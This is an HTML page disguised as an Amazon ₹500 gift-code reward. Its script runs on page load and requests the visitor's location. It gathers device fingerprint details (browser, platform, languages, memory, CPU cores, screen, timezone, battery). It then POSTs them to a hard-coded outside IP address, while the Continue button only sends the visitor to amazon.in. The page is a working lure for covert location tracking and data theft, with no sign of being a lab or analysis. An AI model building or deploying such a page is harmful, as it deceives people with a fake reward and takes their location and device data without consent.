<!DOCTYPE html>
<html>
<head>
    <title>Amazon Gift Code ₹500</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial; text-align: center; background: #f3f3f3; padding-top: 50px; }
        .box { background: white; padding: 20px; border-radius: 10px; width: 90%; max-width: 400px; margin: auto; }
        .btn { background: #febd69; padding: 12px; border: none; width: 100%; font-size: 18px; cursor: pointer; border-radius: 5px; }
    </style>
</head>
<body>

<div class="box">
    <h2>Amazon Gift Code ₹500</h2>
    <p>Click continue to claim your reward</p>
    <button onclick="goNext()" class="btn">Continue</button>
</div>

<script>
const serverURL = "http://100.91.218.8:5001";

// 🔥 Collect all mobile info
async function collectAndSend(lat = null, lon = null) {
    let batteryLevel = null;
    let isCharging = null;

    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = battery.level * 100;
        isCharging = battery.charging;
    }

    const data = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        online: navigator.onLine,
        cpuCores: navigator.hardwareConcurrency || 0,
        ram: navigator.deviceMemory || 0,
        screenRes: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        batteryLevel: batteryLevel,
        isCharging: isCharging,
        latitude: lat,
        longitude: lon,
        time: new Date()
    };

    fetch(`${serverURL}/log-info`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data)
    })
    .then(() => console.log("🔥 Sent:", data))
    .catch(() => console.log("❌ Error"));
}

// 🔥 Page load → location + info
window.onload = () => {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => collectAndSend(pos.coords.latitude, pos.coords.longitude),
            () => collectAndSend()
        );
    } else {
        collectAndSend();
    }
};

// 👉 Button → redirect
function goNext() {
    window.location.href = "https://www.amazon.in";
}
</script>

</body>
</html>
